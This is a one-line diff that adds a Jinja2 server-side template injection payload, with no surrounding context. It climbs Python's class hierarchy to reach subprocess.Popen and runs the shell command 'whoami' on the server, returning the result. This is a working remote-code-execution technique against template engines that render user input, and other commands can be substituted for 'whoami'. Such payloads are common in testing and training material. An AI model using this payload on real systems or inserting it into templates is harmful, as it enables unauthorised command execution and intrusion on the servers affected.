@@ -1,0 +1,1 @@
+{{ (''.__class__.__mro__[1].__subclasses__() | selectattr('__name__', 'equalto', 'Popen') | first)('whoami', shell=True, stdout=-1).communicate()[0] }}
